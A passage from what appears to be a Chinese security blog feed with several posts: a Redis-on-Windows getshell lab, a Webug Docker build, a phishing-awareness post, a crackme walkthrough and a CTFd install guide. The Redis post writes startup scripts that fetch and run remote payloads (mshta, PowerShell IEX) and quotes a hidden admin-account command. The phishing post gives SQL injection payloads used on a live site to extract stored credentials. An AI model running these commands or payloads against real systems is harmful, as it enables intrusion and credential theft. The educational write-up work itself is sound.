class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/msh_shell) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; set lhost 192.168.230.133</span><br><span class="line">lhost =&gt; 192.168.230.133</span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; set uripath shell</span><br><span class="line">uripath =&gt; shell</span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; exploit </span><br><span class="line">zlib(finalizer): the stream was freed prematurely.</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.230.133:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/shell</span><br><span class="line">[*] Local IP: http://192.168.230.133:8080/shell</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://192.168.230.133:8080/shell&quot;</span><br></pre></td></tr></table></figure><p>然后利用Redis写入bat文件到启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line">192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; set x &quot;\r\n\r\nmshta http://192.168.230.133:8080/shell\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><img src="/img/2019/08/12/007DFXDhgy1g5vo0q7gytj30qm0810ta.jpg" alt><br>手动重启靶机就可以拿到session了<br><img src="/img/2019/08/12/007DFXDhly1g5vo93hz7zj30re08l43q.jpg" alt></p><h2 id="使用Cobalt-Strike"><a href="#使用Cobalt-Strike" class="headerlink" title="使用Cobalt Strike"></a>使用Cobalt Strike</h2><p>下载地址就不提供了，我是把Cobalt Strike的服务端脚本放到了kali上运行，然后客户端是在我本机(win10)运行的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tools/cobaltctrike3.13-cracked# ./teamserver 192.168.230.133 233</span><br><span class="line">[*] Generating X509 certificate and keystore (for SSL)</span><br><span class="line">[+] Team server is up on 50050</span><br><span class="line">[*] SHA256 hash of SSL cert is: 56b1896ec2bc1dfaab7445e7b9e63f30ab640e5a6180c2ac41de3d936da6c13b</span><br></pre></td></tr></table></figure><p>然后用客户端连接，用户名是msf，密码是233，端口具体看服务端返回的<br><img src="/img/2019/08/12/007DFXDhly1g5vpjasyjjj30s70bdwfo.jpg" alt><br>创建一个listener，payload默认，端口自己设置<br><img src="/img/2019/08/12/007DFXDhly1g5vpkzl22pj31130hz75e.jpg" alt><br>生成攻击脚本，注意端口别冲突<br><img src="/img/2019/08/12/007DFXDhgy1g5vpnhx4fyj30qz0ch753.jpg" alt><br><img src="/img/2019/08/12/007DFXDhgy1g5vpo5ucvjj30ry0eft9c.jpg" alt><br>最后生成一串payload，用redis写一个bat脚本到启动项，然后等待目标重启即可<br><img src="/img/2019/08/12/007DFXDhly1g5vpqf1cn7j30px0bbt8u.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line">192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; set x &quot;\r\n\r\npowershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.230.133:80/a&apos;))\&quot;\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>手动重启靶机后Cobalt Strike客户端里就看到有主机上线了~<br><img src="/img/2019/08/12/007DFXDhgy1g5vpcs30fkj30yq0c6q3o.jpg" alt></p><h2 id="利用web服务"><a href="#利用web服务" class="headerlink" title="利用web服务"></a>利用web服务</h2><p>如果有Web业务的话，可以结合web业务进行Getshell。也是比较鸡肋，起码网站的根目录你得知道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line">192.168.230.134:6379&gt; config set dir &quot;C:/phpstudy/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; config set dbfilename phpinfo.php</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.230.134:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><img src="/img/2019/08/12/007DFXDhgy1g5vqcoyp9ij31hc0scdjz.jpg" alt></p><h1 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h1><p>在真实环境中确实遇到了几个可以访问启动目录的系统，在测试的过程中，如果安装了安全软件也是可以拿到shell的。还有就是不知道如果开了3389端口的情况下，如果直接执行<code>net user test$ xxxxxx /add &amp; net localgroup administrators test$ /add</code>这种命令会怎样？本地靶机测试是可以的。如果遇到server 2003的系统，可以用写MOF的方法拿shell。真实的业务环境还是很复杂，但是方法总比困难多。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote><p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a><br><a href="https://blog.csdn.net/weixin_33928467/article/details/86254639" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33928467/article/details/86254639</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>首发，Webug4.0的Docker版本来了！</title>
      <link href="/2019/08/04/Webug-docker/"/>
      <url>/2019/08/04/Webug-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WeBug名称定义为”我们的漏洞”靶场环境 ，基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。在webug3.0发布后的四百多天226安全团队终于在大年初二发布了webug的4.0版本。<br>Webug4.0官网地址：<code>https://www.webug.org</code><br>Webug4.0官方源码：<code>https://github.com/wangai3176/webug4.0</code><br>Webug4.0安装介绍：<code>https://www.freebuf.com/column/195521.html</code><br>基于项目的源码搭建了一个Docker版本的Webug4.0，已经push到了Docker hub，欢迎大家下载来玩~<br>听很多小伙伴说有时候自己搭建的时候，由于php版本问题导致有些注入题做不了，这点我做Docker镜像的时候想到了，然后搭建完本地测试了一下，注入题没问题。希望小伙伴们在玩的过程中遇到问题及时联系我反馈啊~<br><a href="http://www.226safe.com/" target="_blank" rel="noopener"><strong>向226安全团队的前辈们致敬~</strong></a></p><h1 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h1><p>首先是下载了Webug4.0版本的源码，然后编写Dockerfile<br>Dockerfile内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:trusty</span><br><span class="line">MAINTAINER Area39@163.com</span><br><span class="line">RUN echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse&quot;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update \</span><br><span class="line">        &amp;&amp; apt-get install -y mysql-server apache2 php5 php5-mysql</span><br><span class="line">COPY sql /root/</span><br><span class="line">RUN /etc/init.d/mysql start &amp;&amp;\</span><br><span class="line">    mysql -e &quot;grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;toor&apos;;&quot;&amp;&amp;\</span><br><span class="line">    mysql -e &quot;grant all privileges on *.* to &apos;root&apos;@&apos;localhost&apos; identified by &apos;toor&apos;;&quot;&amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor --default-character-set=utf8 &lt;/root/webug.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor &lt;/root/webug_sys.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor &lt;/root/webug_width_byte.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot;</span><br><span class="line">RUN sed -Ei &apos;s/^(bind-address|log)/#&amp;/&apos; /etc/mysql/my.cnf \</span><br><span class="line">&amp;&amp; echo &apos;skip-host-cache\nskip-name-resolve&apos; | awk &apos;&#123; print &#125; $1 == &quot;[mysqld]&quot; &amp;&amp; c == 0 &#123; c = 1; system(&quot;cat&quot;) &#125;&apos; /etc/mysql/my.cnf &gt; /tmp/my.cnf \</span><br><span class="line">&amp;&amp; mv /tmp/my.cnf /etc/mysql/my.cnf</span><br><span class="line">COPY webug /var/www/html</span><br><span class="line">RUN rm /var/www/html/index.html &amp;&amp;\</span><br><span class="line"> chown www-data:www-data /var/www/html -R &amp;&amp;\</span><br><span class="line"> rm -rf /root/*</span><br><span class="line">COPY httpd-foreground /usr/bin</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD [&quot;httpd-foreground&quot;]</span><br></pre></td></tr></table></figure><p>在这里踩了个坑，Dockerfile第11行<code>mysql -u root -ptoor &lt;/root/webug.sql</code>，由于导入数据库文件时没指定字符集，所以直接乱码了。解决方法：<code>mysql -u root -ptoor --default-character-set=utf8 &lt;/root/webug.sql</code>指定为utf8就可以了。</p><h1 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h1><ul><li>通过Dockerfile</li><li>通过Docker hub</li></ul><h2 id="通过Dockerfile搭建"><a href="#通过Dockerfile搭建" class="headerlink" title="通过Dockerfile搭建"></a>通过Dockerfile搭建</h2><p>项目已经传到了Github，<a href="https://github.com/Area39/Webug4.0-Docker" target="_blank" rel="noopener">传送门</a><br>目录结构<br><img src="/img/2019/08/04/007DFXDhgy1g5nckxhmv5j30uk04uq38.jpg" alt><br>然后在本目录下输入<code>docker build -t webug:4.0 .</code><br><img src="/img/2019/08/04/007DFXDhgy1g5ncmy9y7fj316d0er401.jpg" alt><br>稍等片刻，你的Webug就搭建完成了。<br>启动Webug:4.0容器<br><code>docker run -d -P webug:4.0</code><br><img src="https://tva3.sinaimg.cn/large/007DFXDhly1g5ncr0avthj314s06274n.jpg" alt><br>然后访问ip+映射的端口，可以看到后台登录界面<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5ncp6v58fj31650kqgmd.jpg" alt><br>默认账号：</p><ul><li>后台管理员：admin/admin</li><li>数据库密码：root/toor</li></ul><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5nctcdvatj31hc0sc77j.jpg" alt></p><h2 id="通过Docker-hub搭建"><a href="#通过Docker-hub搭建" class="headerlink" title="通过Docker hub搭建"></a>通过Docker hub搭建</h2><p>为了大家方便使用，已经push到了docker hub上面。<br>从Docker hub上拉取镜像<br><code>docker pull area39/webug</code><br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5nd0z95hyj30yf0bzdgu.jpg" alt><br>启动过程<br><code>docker run -d -P area39/webug</code><br><img src="https://tva3.sinaimg.cn/large/007DFXDhly1g5oprxekjnj314w052dg7.jpg" alt><br>此时你的Webug就能使用啦。<br><img src="/img/2019/08/04/007DFXDhgy1g5nd8tcujij31460ne0ti.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 靶机搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 靶机搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的QQ就是这样被盗的|防范网络钓鱼</title>
      <link href="/2019/07/08/Phishing-site/"/>
      <url>/2019/07/08/Phishing-site/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前在qq上就收到过朋友发来的二维码链接啥的，一般的套路就是诱导你扫描这个二维码或者点击这个链接。<br>例如某天爱玩吃鸡的你收到一条链接，标题是点击领取金币领皮肤领…然后你兴奋的不行，点开之后让你输入账号密码登录，你看着这个页面，没有发现半点可疑的地方，然后就把账号密码随手输了进去。不一会儿，你的qq提示在其他地方登录，然后你列表的好友就都收到了你发给他们的链接。又比如某天，你收到一条消息/一条空间留言，内容是：这个人的qq空间里怎么有你的照片？又或者是：这个人是谁？为什么他空间有你俩的合影？单纯善良好奇心又巨强的你瞬间懵了，同学？我和谁合过影啊？都忘了，赶紧去看看。但是你点击以后是个qq空间的页面让你登录，合情合理啊，毕竟是qq空间相册，那就登录呗，然后你qq就掉线了。<br>本文没啥技术含量，因为这几天正好碰到一个钓鱼网站，结合着真实的钓鱼网站打算给朋友们科普一下，提高一下防范意识。  </p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>某个无聊的下午，正吃着西瓜刷着微博，突然收到一条QQ消息，吓得我赶紧放下了手中的西瓜…<br>是一个朋友发来的消息，内容如下：<br><img src="/img/2019/07/08/007DFXDhgy1g4s5b20ueqj30jg0e8myh.jpg" alt><br>那就扫一下呗，二维码直接拿到电脑上扫了一下，得到一个短网址<br><img src="/img/2019/07/08/007DFXDhgy1g4s5q096gwj30rl0agdft.jpg" alt><br>还原短网址得到一个链接<br><img src="/img/2019/07/08/007DFXDhgy1g4s5qutvsdj31520fedg5.jpg" alt><br>然后我们直接访问这个链接，会先出现一个电脑管家安全检测的页面，最终会跳转到真实钓鱼网站的页面。不得不说，这个安全检测过程做的还有模有样的，这个过程会让人们更容易相信这是一个安全的网站，减少顾虑，从而增加成功的概率。(如果在手机qq里面长按二维码识别，然后跳转到钓鱼网站页面的过程是看不到网站域名的，最终只有一个qq空间登录页面。)<br><img src="/img/2019/07/08/007DFXDhgy1g4s6gdq47vj321n0u0di8.jpg" alt><br>正常情况下，输入qq号码和密码后跳转到QQ空间黄钻活动页面。<br><img src="/img/2019/07/08/007DFXDhgy1g4s6qqeplqj31hc0scab4.jpg" alt><br><img src="/img/2019/07/08/007DFXDhgy1g4sjxauxykj31hc0scjtb.jpg" alt>  </p><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><p>前两天在FreeBuf上看到一个大佬对这类钓鱼网站的源码做了代码审计(<a href="https://www.freebuf.com/column/207162.html" target="_blank" rel="noopener">传送门</a>)，正好拿这个网站练练手。无奈管理员登录界面根本找不到，猜了半天，最终发现有一个“后台”拼音缩写的目录，但是访问也跳转不到管理地址，又扫了一下，无果，遂放弃。<br><img src="/img/2019/07/08/007DFXDhgy1g4s73og3yjj31040eaglv.jpg" alt>  </p><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>在对传递参数进行测试的过程中，发现密码输入框处存在SQL注入漏洞。<br>正常输入：<br><img src="/img/2019/07/08/007DFXDhgy1g4s7ep27jfj30xr0d8t9w.jpg" alt><br>传递单引号报错：<br><img src="/img/2019/07/08/007DFXDhgy1g4sk6lanbmj31fv0jhgn3.jpg" alt><br>此处的查询语句应该是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from qq where username=&apos;xxx&apos; and password=&apos;xxx&apos;;</span><br></pre></td></tr></table></figure><p>本来以为是Sqlmap一把梭的那种，结果跑一下就被waf封IP，那就手工呗。<br>报错注入，已知表名是qq，字段名是username,password<br>获取数据库名：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="/img/2019/07/08/007DFXDhgy1g4uimkq8yvj31bx0e675r.jpg" alt><br>数据库名字为’db’，猜测管理员表名为admin，字段名同上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.admin),0x7e)))#</span><br></pre></td></tr></table></figure><p>由于extractvalue()这几种报错注入的方法最多显示32位，所以可以用substring()分割一下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(substring((select password from db.admin),1,16 )),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="/img/2019/07/08/007DFXDhgy1g4s865t25rj31es0frjsx.jpg" alt><br><img src="/img/2019/07/08/007DFXDhgy1g4s8vui48sj31gc0cemyq.jpg" alt><br><img src="/img/2019/07/08/007DFXDhgy1g4s8wmfu6qj31gf0c875u.jpg" alt><br>拿数据库的密码时用了另外一种方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1 from (select count(*),concat(&apos;~&apos;,(select Password from mysql.user where host=&apos;127.0.0.1&apos; limit 0,1),&apos;~&apos;,floor(rand(0)*2)) as a from information_schema.tables group by a)b)#</span><br></pre></td></tr></table></figure><p><img src="/img/2019/07/08/007DFXDhgy1g4s929b50aj31ge0dsjt7.jpg" alt><br>查受害者的账号密码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.qq where id=1),0x7e,(select password from db.qq where id=1),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="/img/2019/07/08/007DFXDhgy1g4s96egdw7j31gf0e675z.jpg" alt><br>本来还想试试load_file()读个配置文件啥的，后来发现是高版本的mysql，凉凉~  </p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>你还想看后续？？？你们有啥想法和思路倒是可以交流一下~比如什么给他提交10万条假数据一类的…  </p><h1 id="科普时间"><a href="#科普时间" class="headerlink" title="科普时间"></a>科普时间</h1><p>收集了几个网上公开的钓鱼网站源码，然后在本地搭建了一下，给大家看下效果。  </p><h2 id="QQ空间钓鱼"><a href="#QQ空间钓鱼" class="headerlink" title="QQ空间钓鱼"></a>QQ空间钓鱼</h2><p>手机访问效果如下：<br>输入账号密码后跳转至真实的网站<br><img src="/img/2019/07/08/007DFXDhgy1g4sidekmc4j31hl0u0dil.jpg" alt><br>此时后台就拿到了你输入的内容<br><img src="/img/2019/07/08/007DFXDhgy1g4siewcdmuj31hc0k43zx.jpg" alt></p><h2 id="游戏活动钓鱼"><a href="#游戏活动钓鱼" class="headerlink" title="游戏活动钓鱼"></a>游戏活动钓鱼</h2><p>访问效果<br><img src="/img/2019/07/08/007DFXDhgy1g4sihch9o9j31hc0scwgc.jpg" alt><br><img src="/img/2019/07/08/007DFXDhgy1g4siiayuw7j31hc0scjt5.jpg" alt><br><img src="/img/2019/07/08/007DFXDhgy1g4sijqnxtnj31hc0izgnm.jpg" alt></p><h2 id="业务活动页面钓鱼"><a href="#业务活动页面钓鱼" class="headerlink" title="业务活动页面钓鱼"></a>业务活动页面钓鱼</h2><p><img src="/img/2019/07/08/007DFXDhgy1g4sip813juj30ya0u0wi3.jpg" alt><br>后台收到账号信息<br><img src="/img/2019/07/08/007DFXDhgy1g4siq4mpdbj31hc0l6wg9.jpg" alt><br>这个网站也是输入完账号密码跳转到真实的页面，我发现这个页面分毫不差，看对比图<br><img src="/img/2019/07/08/007DFXDhgy1g4siust5ogj30ya0u079u.jpg" alt><br>如何辨别钓鱼网站？<a href="https://www.zhihu.com/question/35424623" target="_blank" rel="noopener">知乎链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 社会工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会工程 </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习[1]一道入门题详解</title>
      <link href="/2019/06/21/Simple-reverse/"/>
      <url>/2019/06/21/Simple-reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学校的练习平台上找到了一个入门级的逆向小程序，给大家拿来练手。面向小白，大佬勿喷。<br><a href="https://pan.baidu.com/s/1wG9nMTSBVuJfK1Rrtds8pw" target="_blank" rel="noopener">程序下载地址，密码：a4nh</a>  </p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>找到验证逻辑的条件判断指令处，通过修改条件跳转指令，使得程序接下来走验证成功流程，即可在验证成功弹出消息框中得到对应Key。<br>首先下载源程序，然后拖到PEiD分析一下 ，发现存在UPX的壳。<br><img src="/img/2019/06/21/007DFXDhgy1g494p0ydboj30hd09w75b.jpg" alt><br>UPX脱壳工具网上有很多，随便找一个对程序进行脱壳即可。<br><img src="/img/2019/06/21/007DFXDhgy1g494r7gjdbj30h60chac5.jpg" alt><br>脱壳成功，然后把脱壳后的程序拖到Ollydbg分析。<br>先查找所有参考文本字符串，定位到程序弹出错误的地方。<br><img src="/img/2019/06/21/007DFXDhgy1g494tu348pj30e909hdg1.jpg" alt><br>查找”Serial is error!”字符串<br>00440570地址<br><img src="/img/2019/06/21/007DFXDhgy1g494vxbqv4j30vt0aht9t.jpg" alt><br><img src="/img/2019/06/21/007DFXDhgy1g494wk3gwsj30z40c9gmy.jpg" alt><br>向下走，发现这个跳转是由上方004404D6地址跳转实现的<br><img src="/img/2019/06/21/007DFXDhgy1g494xtery3j30yo0bg0ty.jpg" alt><br><img src="/img/2019/06/21/007DFXDhgy1g494ypdpojj30zi0bl3zl.jpg" alt><br>但是这个条件不是<br>继续向下走，00440500地址还有一处跳转，这个跳转是距离错误提示最近的<br><img src="/img/2019/06/21/007DFXDhgy1g494zl6tarj30yf0b5wfj.jpg" alt><br>我们在此处用NOP填充<br><img src="/img/2019/06/21/007DFXDhgy1g4950bzos2j30yo0bb40o.jpg" alt><br>然后再次运行程序，输入任意字符得到Key<br><img src="/img/2019/06/21/007DFXDhgy1g4951h8kw1j31030iidic.jpg" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>非常基础入门的一道逆向题，希望以后有机会和时间能更新一些进阶的题目~</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈新版CTFd的安装以及后期运维</title>
      <link href="/2019/06/19/Install-ctfd/"/>
      <url>/2019/06/19/Install-ctfd/</url>
      
        <content type="html"><![CDATA[<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p><strong>由于CTFd版本更新等各种原因，此安装方法永久失效，只有nginx部分可以参考。另外新版CTFd的安装方法网上很多，祝大家成功。</strong></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间学校社团组织了一次CTF小比赛，当时就是用的CTFd这个平台。无奈的是最近CTFd更新了，所以旧版本的包我就安装不上了。最近研究了一下新版的CTFd(v2.1.2)，顺便还把新版的CTFd汉化了。总体来说，现在的CTFd功能越来越强大了，变成了团队赛以及个人赛两种模式，在管理员后台也可以给一些用户进行奖励加分的操作等等…<br><a href="https://github.com/CTFd/CTFd/" target="_blank" rel="noopener">官方Github地址</a>  </p><h1 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h1><ul><li>Centos 7 64位  </li><li>Docker  </li><li>docker-compose  </li><li>nginx  </li><li>python2.7  </li><li>python-pip  </li></ul><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>我感觉用Docker安装更加方便一些，所以此次用docker-compose up的方式进行安装的。  </p><h2 id="首先安装Docker"><a href="#首先安装Docker" class="headerlink" title="首先安装Docker"></a>首先安装Docker</h2><p>安装需要的软件包  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>设置yum源  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure><p>启动并加入开机启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p>验证是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="/img/2019/06/19/007DFXDhgy1g45kxdj28gj30rs0cn0tf.jpg" alt>  </p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p><a href="https://www.cnblogs.com/YatHo/p/7815400.html" target="_blank" rel="noopener">参考链接</a><br>先安装python-pip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release </span><br><span class="line">yum -y install python-pip</span><br></pre></td></tr></table></figure><p>检查pip是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip -V</span><br></pre></td></tr></table></figure><p><img src="/img/2019/06/19/007DFXDhgy1g45l2t0tddj30rs01ea9x.jpg" alt><br>对安装的pip进行升级(可选)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>正式开始安装docker-compose  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>安装pip报错以及解决方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果报错：ReadTimeoutError: HTTPSConnectionPool(host=&apos;pypi.python.org&apos;, port=443): Read timed out</span><br><span class="line">解决方法：pip --default-timeout=200 install -U docker-compose</span><br></pre></td></tr></table></figure><p>检查docker-compose是否成功安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p><img src="/img/2019/06/19/007DFXDhgy1g45l3vs231j30rs01dmx1.jpg" alt>  </p><h2 id="下载CTFd"><a href="#下载CTFd" class="headerlink" 